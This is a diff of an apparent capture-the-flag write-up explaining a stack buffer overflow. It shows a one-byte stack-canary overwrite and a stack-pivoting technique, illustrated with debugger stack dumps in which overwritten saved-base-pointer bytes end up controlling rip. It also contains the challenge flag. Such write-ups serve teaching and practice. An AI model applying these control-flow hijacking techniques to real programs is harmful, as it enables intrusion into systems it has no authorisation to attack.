@@ -14,12 +14,12 @@ The program reads an input of 0x38 bytes and saves it in a 56(0x38) long char ar
 Being the stack frame like this
 |address (higher to lower)|value|
 |---|---|
-|rbp|saved base pointer|
-|rbp-0x8|stack canary|
+|rbp-0x44|inputLen|
+|rbp-0x40|*buf|
 |rbp-0x10|*buf+48|
 |...|...|
-|rbp-0x40|*buf|
-|rbp-0x44|inputLen|
+|rbp-0x8|stack canary|
+|rbp|saved base pointer|
 
 If we send 56 characters, `0xa` will be saved in `*buf+56`, which is no longer a value of **buf** (because it ends at `*buf+55`) but is the *less significant byte* of **stack canary**.
 
@@ -32,12 +32,67 @@ Usually the goal of a buffer overflow is to overwrite the **return address** in 
 <br>
 On the stack, before the **return address**, is stored the **saved base pointer** of the previous stack frame, and luckly, there's a tecnique called *stack pivoting* wich allows us to redirect the program flow by editing the value of the **saved base pointer**.
 
-To well undestand how *stack pivoting* works we can assume that the stack of this executable at the moment of the second `read()` would looks like this
-|address (higher to lower)|value|
 
+### Stack Pivoting
+- This is the stack while we are in the `welcome()` function
+```bash
+00:0000│ rsp 0x7ffee1f1b080 ◂— 0x0
+01:0008│     0x7ffee1f1b088 ◂— 0x38194fa013
+02:0010│     0x7ffee1f1b090 ◂— 0x4141414141414141 ('AAAAAAAA')
+... ↓        6 skipped
+09:0048│     0x7ffee1f1b0c8 ◂— 0x4242424242424242 ('BBBBBBBB')
+0a:0050│ rbp 0x7ffee1f1b0d0 ◂— 0x4343434343434343 ('CCCCCCCC')
+0b:0058│     0x7ffee1f1b0d8 —▸ 0x4011c7 (main+101)
+0c:0060│     0x7ffee1f1b0e0 —▸ 0x7ffee1f1b1e0
+0d:0068│     0x7ffee1f1b0e8 —▸ 0x402004 ◂— 'Welcome!!!\n'
+0e:0070│     0x7ffee1f1b0f0 ◂— 0x0
+0f:0078│     0x7ffee1f1b0f8 —▸ 0x7f661948d0b3 (__libc_start_main+243)
+```
 
+- **leave** (`mov rsp, rbp` and `pop rbp`) from `welcome()`
+```bash
+00:0000│ rsp 0x7ffee1f1b0d8 —▸ 0x4011c7 (main+101)
+01:0008│     0x7ffee1f1b0e0 —▸ 0x7ffee1f1b1e0 ◂— 0x1
+02:0010│     0x7ffee1f1b0e8 —▸ 0x402004 ◂— 'Welcome!!!\n'
+03:0018│     0x7ffee1f1b0f0 ◂— 0x0
+04:0020│     0x7ffee1f1b0f8 —▸ 0x7f661948d0b3 (__libc_start_main+243)
+... ↓        
+..:....│ rbp 0x4343434343434343 ◂— 0xdeadbeef
+```
 
+- **ret** (`pop rip`)
+```bash
+00:0000│ rsp 0x7ffee1f1b0e0 —▸ 0x7ffee1f1b1e0 ◂— 0x1
+01:0008│     0x7ffee1f1b0e8 —▸ 0x402004 ◂— 'Welcome!!!\n'
+02:0010│     0x7ffee1f1b0f0 ◂— 0x0
+03:0018│     0x7ffee1f1b0f8 —▸ 0x7f661948d0b3 (__libc_start_main+243)
+... ↓        
+..:....│ rbp 0x4343434343434343 ◂— 0xdeadbeef
 
+rip 0x4011c7 (main+101)
+```
+- 0x4011c7 contains `mov rax, 0` so this is executed and the `rip` is incremented to 0x4011cc
+- **leave** (`mov rsp, rbp` and `pop rbp`) from `main()`
+```bash
+00:0000│     0x4343434343434343
+01:0008│ rsp 0x434343434343434b
+... ↓
+..:....│ rbp 0xdeadbeef
+
+rip 0x4011cd
+```
+
+- **ret** (`pop rip`)
+```bash
+00:0000│     0x434343434343434b
+01:0008│ rsp 0x4343434343434353
+... ↓
+..:....│ rbp 0xdeadbeef
+
+rip 0x4343434343434353
+```
+
+We managed to give `rip` the value of the **saved base pointer (incremented by 0x10)** saved in the `welcome()` frame, which we can arbitrary change due to the stack overflow.
 
 ## Flag
 `flag{d0Nt_F0rg37_y0uR_5tr1nG_T3rM1n470R}`
